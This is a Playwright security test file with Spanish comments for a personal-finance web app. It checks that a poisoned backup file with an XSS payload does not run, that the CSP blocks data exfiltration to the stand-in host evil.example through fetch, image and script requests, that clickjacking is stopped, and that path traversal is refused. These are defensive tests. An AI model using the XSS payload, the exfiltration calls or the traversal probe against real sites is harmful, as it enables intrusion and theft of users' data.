// t118: seguridad del cliente. Respaldo envenenado (XSS), CSP real en las tres páginas, anti-clickjacking y servidor de pruebas sin salida de carpeta.
const {chromium}=require('playwright');const fs=require('fs'),path=require('path'),http=require('http');
const chart=fs.readFileSync(__dirname+'/node_modules/chart.js/dist/chart.umd.js','utf8');
const demo=JSON.parse(fs.readFileSync(__dirname+'/demo.json','utf8'));const ROOT=path.join(__dirname,'..');
let ok=0,bad=0;const T=(n,c)=>{c?ok++:(bad++,console.log('FALLA',n));};
const types={'.html':'text/html;charset=utf-8','.js':'application/javascript','.json':'application/json','.jpg':'image/jpeg','.png':'image/png','.webmanifest':'application/manifest+json','.svg':'image/svg+xml'};
const srv=http.createServer((q,r)=>{if(q.url==='/__marco'){r.writeHead(200,{'content-type':'text/html'});r.end('<!doctype html><iframe id=v src="http://127.0.0.1:'+srv.address().port+'/index.html" width=800 height=600></iframe>');return;}let u=decodeURIComponent(q.url.split('?')[0]);if(u.endsWith('/'))u+='index.html';const f=path.join(ROOT,u);if(!f.startsWith(ROOT+path.sep)||f.includes(path.sep+'.git')){r.writeHead(403);r.end();return;}fs.readFile(f,(e,d)=>{if(e){r.writeHead(404);r.end();return;}r.writeHead(200,{'content-type':types[path.extname(f)]||'application/octet-stream'});r.end(d);});});
const X='"\'`><img src=x onerror=__x()></style></script><svg onload=__x()>';
const abrir=async(b,base,url)=>{const ctx=await b.newContext({viewport:{width:1280,height:900},locale:'es-PE',timezoneId:'America/Lima',serviceWorkers:'block'});const p=await ctx.newPage();p.evil=[];p.errs=[];p.on('pageerror',e=>p.errs.push(e.message));p.on('dialog',d=>d.accept());
  await p.addInitScript(()=>{window.__hits=0;window.__x=()=>{window.__hits++;};window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.blockedURI+' '+e.effectiveDirective));});
  await p.route('**/*',r=>{const u=r.request().url();if(u.startsWith(base))return r.continue();if(u.includes('evil.example')){p.evil.push(u);return r.fulfill({status:200,body:'x'});}if(/chart/i.test(u))return r.fulfill({contentType:'application/javascript',headers:{'access-control-allow-origin':'*'},body:chart});if(u.includes('supabase.co'))return r.fulfill({status:201,contentType:'application/json',headers:{'access-control-allow-origin':'*','access-control-allow-headers':'*'},body:'[]'});return r.abort();});
  await p.goto(base+url);await p.waitForTimeout(900);return p;};
const robar=p=>p.evaluate(async()=>{const out={};try{await fetch('https://evil.example/robo?d=1',{mode:'no-cors'});out.fetch=true;}catch(e){out.fetch=false;}
  await new Promise(r=>{const i=new Image();i.onload=i.onerror=r;i.src='https://evil.example/pixel.png?d=1';});
  await new Promise(r=>{const s=document.createElement('script');s.onload=s.onerror=r;s.src='https://evil.example/malo.js';document.head.appendChild(s);});
  out.csp=window.__csp.filter(x=>x.includes('evil.example')).length;return out;});
(async()=>{
  await new Promise(r=>srv.listen(0,'127.0.0.1',r));const base='http://127.0.0.1:'+srv.address().port+'/';const b=await chromium.launch();
  // 1. Respaldo envenenado por los dos caminos que eran explotables, más textos de filas
  let p=await b.newContext({viewport:{width:1280,height:900},locale:'es-PE',timezoneId:'America/Lima'}).then(c=>c.newPage());p.on('dialog',d=>d.accept());
  await p.addInitScript(()=>{window.__hits=0;window.__x=()=>{window.__hits++;};try{localStorage.setItem('mis-finanzas-prototipo-v1-instalar','1');}catch(e){}});
  await p.route('**/*',r=>{const u=r.request().url();if(u.startsWith('http://127.0.0.1:8765'))return r.continue();if(u.includes('hart'))return r.fulfill({contentType:'application/javascript',headers:{'access-control-allow-origin':'*'},body:chart});return r.abort();});
  await p.goto('http://127.0.0.1:8765/wrap-repo.html#ajustes');await p.waitForSelector('#app');await p.waitForTimeout(500);
  const S=JSON.parse(JSON.stringify(demo.S)),m=S['2026'][10];m.bbva=[{c:X,m:50,f:'3-nov',k:X,cur:X}];
  const cid={};['bbva','bcp','oh','ing','fij','hor'].forEach(k=>{cid[k]={cur:X,w:X,ty:X};});
  const j={S,cfg:Object.assign({},demo.cfg,{bancos:{bbva:X,bcp:X,oh:X},onb:1}),LAY:{mes:{order:[X],c:Object.assign(cid,{[X]:{cur:X}})},resumen:{order:[X],c:{}}}};
  await p.setInputFiles('#bk-file',{name:'plantilla.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(j))});await p.waitForTimeout(800);
  for(const v of ['#noviembre','#resumen','#ajustes','#noviembre']){await p.evaluate(h=>{location.hash=h;},v);await p.waitForTimeout(350);}
  await p.locator('[data-act="pagar"][data-card="bbva"]').first().click({force:true});await p.waitForTimeout(250);await p.keyboard.press('Escape');
  T('un respaldo envenenado no ejecuta código',(await p.evaluate(()=>window.__hits))===0);
  T('no inyecta elementos en la pantalla',(await p.evaluate(()=>document.querySelectorAll('#app img[src="x"],#app svg[onload]').length))===0);
  T('la moneda envenenada vuelve a soles',/S\/ 50\.00/.test(await p.evaluate(()=>(document.getElementById('cd-bbva')||{}).textContent||'')));
  T('el nombre de la tarjeta queda sin caracteres de HTML',!/[<>"`]/.test(await p.evaluate(()=>{const e=document.querySelector('[data-cid="bbva"] h2,[data-cid="bbva"] .ttl');return e?e.textContent:'';})));
  await p.context().close();
  // 2. CSP real en las tres páginas
  for(const [nom,url] of [['app','index.html'],['landing','inicio/index.html'],['legal','legal.html']]){
    p=await abrir(b,base,url);const leg=await p.evaluate(()=>window.__csp.slice());
    T(nom+': la propia página no viola su CSP'+(leg.length?' → '+leg.join(' | '):''),leg.length===0);
    const r=await robar(p);
    T(nom+': no deja sacar datos a un dominio ajeno (fetch, imagen, script)',r.fetch===false&&r.csp>=3&&p.evil.length===0);
    T(nom+': sin errores de JavaScript'+(p.errs.length?' → '+p.errs[0]:''),p.errs.length===0);await p.context().close();}
  p=await abrir(b,base,'index.html');
  const permit=await p.evaluate(async()=>{const urls=['https://cdn.jsdelivr.net/npm/exceljs@4.4.0/dist/exceljs.min.js','https://cdn.jsdelivr.net/npm/jspdf@2.5.1/dist/jspdf.umd.min.js','https://cdn.jsdelivr.net/npm/jspdf-autotable@3.8.2/dist/jspdf.plugin.autotable.min.js'];window.__csp.length=0;
    for(const u of urls)await new Promise(r=>{const s=document.createElement('script');s.onload=s.onerror=r;s.src=u;document.head.appendChild(s);});return window.__csp.slice();});
  T('app: la CSP permite las librerías de los reportes',permit.length===0);
  const otra=await p.evaluate(async()=>{window.__csp.length=0;await new Promise(r=>{const s=document.createElement('script');s.onload=s.onerror=r;s.src='https://cdn.jsdelivr.net/npm/paquete-malo@1.0.0/x.js';document.head.appendChild(s);});return window.__csp.length;});
  T('app: la CSP no permite otro paquete del mismo CDN',otra===1);await p.context().close();
  // 3. Clickjacking
  {const ctx=await b.newContext();const f=await ctx.newPage();await f.route(/cdn|fonts|supabase|er-api/,r=>r.abort());
   await f.goto('http://localhost:'+srv.address().port+'/__marco').catch(()=>{});await f.waitForTimeout(1000);
   const salio=f.url().startsWith(base);let oculta=false;if(!salio){const fr=f.frames().find(x=>x.url().startsWith(base));oculta=!!fr&&await fr.evaluate(()=>getComputedStyle(document.documentElement).display==='none').catch(()=>false);}
   T('dentro de un marco ajeno la app no se puede usar',salio||oculta);await ctx.close();}
  // 4. Servidor de pruebas
  {const c=await new Promise(res=>{const q=http.request({host:'127.0.0.1',port:8765,path:'/../index.html'},r=>{r.resume();res(r.statusCode);});q.on('error',()=>res(0));q.end();});T('el servidor de pruebas no sale de dev/',c===403);}
  console.log('Total '+(ok+bad)+' ok '+ok+' fallas '+bad);await b.close();srv.close();process.exit(bad?1:0);
})().catch(e=>{console.log('ERR',e);process.exit(1);});
